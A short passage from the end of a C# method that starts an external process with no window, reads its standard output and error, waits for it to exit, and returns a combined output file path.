            psi.RedirectStandardError = true;
            psi.CreateNoWindow = true;
            
            Process process = Process.Start(psi);
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();
            
            return Path.Combine(outputPath, outputName);
        }
    }
}